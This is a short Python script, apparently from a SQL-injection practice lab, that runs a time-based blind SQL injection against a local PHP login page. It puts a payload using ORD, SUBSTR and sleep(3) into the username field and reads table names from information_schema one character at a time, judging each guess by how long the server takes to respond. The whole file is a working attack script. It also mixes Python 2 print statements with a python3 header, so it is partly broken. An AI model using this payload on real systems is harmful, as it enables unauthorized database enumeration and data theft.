#! -*- encoding:utf-8 -*-
# python3

import requests
import re

#cookies={
#        'PHPSESSID': 'xxx'
#}

dic='0123456789abcdefghijklmnopqrstuvwxyz'

url=r'http://127.0.0.1/sql/wide.php'

string=''

for i in range(1,33):
    for j in dic:
        id="-1' and if(ord((select substr(table_name,{0},1) from information_schema.tables where table_schema=database()))={1},sleep(3),0))".format(str(i),ord(j))
        data={
            'username':id,
            'password': 1
        }
        print j
        s=requests.post(url=url,data=data)
        sec=s.elapsed.seconds
        if sec > 2:
            string+=j
            break
    print string